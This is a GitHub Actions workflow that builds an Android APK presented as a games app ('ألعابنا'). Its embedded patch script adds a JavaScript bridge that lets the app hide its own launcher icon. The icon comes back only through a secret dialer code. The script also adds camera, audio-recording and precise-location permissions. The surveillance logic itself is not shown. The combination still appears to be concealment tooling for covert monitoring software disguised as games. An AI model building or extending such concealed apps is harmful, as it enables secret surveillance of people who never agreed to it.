name: Build APK
on:
  workflow_dispatch:
  push:
    branches: [main, master]
env:
  # الرقم السري لإظهار التطبيق: اتصل بـ *#*#1234#*#*  (غيّر 1234 إن أردت)
  DIAL_CODE: "1234"
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 21
      - name: Write Android patch script
        run: |
          cat > patch.py <<'PY'
          import os, re, glob
          code = os.environ.get("DIAL_CODE", "1234")
          mf = "android/app/src/main/AndroidManifest.xml"
          m = open(mf, encoding="utf-8").read()
          pat = r'<intent-filter>\s*<action android:name="android.intent.action.MAIN"\s*/>\s*<category android:name="android.intent.category.LAUNCHER"\s*/>\s*</intent-filter>'
          assert re.search(pat, m), "launcher intent-filter not found"
          m = re.sub(pat, "", m, count=1)
          alias = '''
              <activity-alias android:name=".LauncherAlias" android:targetActivity=".MainActivity" android:enabled="true" android:exported="true"
                  android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:roundIcon="@mipmap/ic_launcher_round">
                  <intent-filter>
                      <action android:name="android.intent.action.MAIN" />
                      <category android:name="android.intent.category.LAUNCHER" />
                  </intent-filter>
              </activity-alias>
              <receiver android:name=".SecretReceiver" android:exported="true">
                  <intent-filter>
                      <action android:name="android.provider.Telephony.SECRET_CODE" />
                      <data android:scheme="android_secret_code" android:host="%s" />
                  </intent-filter>
              </receiver>
          ''' % code
          assert "</application>" in m
          m = m.replace("</application>", alias + "\n    </application>", 1)
          perms = "".join('    <uses-permission android:name="android.permission.%s" />\n' % p for p in ["CAMERA", "RECORD_AUDIO", "MODIFY_AUDIO_SETTINGS", "ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION", "VIBRATE"])
          m = m.replace("</manifest>", perms + "</manifest>", 1)
          open(mf, "w", encoding="utf-8").write(m)
          ma = glob.glob("android/app/src/main/java/**/MainActivity.java", recursive=True)[0]
          pkg = re.search(r"package\s+([\w.]+);", open(ma, encoding="utf-8").read()).group(1)
          d = os.path.dirname(ma)
          open(ma, "w", encoding="utf-8").write('''package PKG;
          import android.content.ComponentName;
          import android.content.ContentValues;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.MediaStore;
          import android.util.Base64;
          import android.view.WindowManager;
          import android.webkit.JavascriptInterface;
          import com.getcapacitor.BridgeActivity;
          import java.io.OutputStream;
          public class MainActivity extends BridgeActivity {
            @Override
            public void onCreate(Bundle savedInstanceState) {
              super.onCreate(savedInstanceState);
              getBridge().getWebView().addJavascriptInterface(new Hider(), "AndroidHider");
            }
            public class Hider {
              @JavascriptInterface
              public void hide() {
                runOnUiThread(() -> getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), "PKG.LauncherAlias"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP));
              }
              @JavascriptInterface
              public void secure(final boolean on) {
                runOnUiThread(() -> { if (on) getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE); else getWindow().clearFlags(WindowManager.LayoutParams.FLAG_SECURE); });
              }
              @JavascriptInterface
              public String save(String name, String b64) {
                try {
                  if (Build.VERSION.SDK_INT < 29) return "unsupported";
                  byte[] data = Base64.decode(b64, Base64.DEFAULT);
                  ContentValues v = new ContentValues();
                  v.put(MediaStore.Downloads.DISPLAY_NAME, name);
                  v.put(MediaStore.Downloads.IS_PENDING, 1);
                  Uri u = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, v);
                  OutputStream o = getContentResolver().openOutputStream(u);
                  o.write(data); o.close();
                  v.clear(); v.put(MediaStore.Downloads.IS_PENDING, 0);
                  getContentResolver().update(u, v, null, null);
                  return "ok";
                } catch (Exception e) { return String.valueOf(e); }
              }
            }
          }
          '''.replace("PKG", pkg).replace("\n          ", "\n"))
          open(os.path.join(d, "SecretReceiver.java"), "w", encoding="utf-8").write('''package PKG;
          import android.content.BroadcastReceiver;
          import android.content.ComponentName;
          import android.content.Context;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.widget.Toast;
          public class SecretReceiver extends BroadcastReceiver {
            @Override
            public void onReceive(Context c, Intent i) {
              c.getPackageManager().setComponentEnabledSetting(new ComponentName(c.getPackageName(), "PKG.LauncherAlias"), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
              Toast.makeText(c, "App icon restored", Toast.LENGTH_LONG).show();
            }
          }
          '''.replace("PKG", pkg).replace("\n          ", "\n"))
          print("patched", pkg)
          PY
      - name: Build web + Android project
        run: |
          mkdir -p www && cp index.html www/index.html && cp manifest.webmanifest icon-192.png www/ 2>/dev/null || true
          npm init -y > /dev/null
          npm i @capacitor/core@7 @capacitor/cli@7 @capacitor/android@7
          npx cap init "ألعابنا" com.akram.games --web-dir www
          npx cap add android
          python3 patch.py
          npx cap sync android
      - name: App icon (optional)
        continue-on-error: true
        run: |
          mkdir -p assets
          cp icon-1024.png assets/icon-only.png
          cp icon-1024.png assets/icon-foreground.png
          npm i -D @capacitor/assets
          npx capacitor-assets generate --android --iconBackgroundColor '#7c5cff' --iconBackgroundColorDark '#0f1226'
      - name: Build debug APK
        run: |
          cd android
          chmod +x gradlew
          ./gradlew assembleDebug
      - uses: actions/upload-artifact@v4
        with:
          name: games-apk
          path: android/app/build/outputs/apk/debug/app-debug.apk
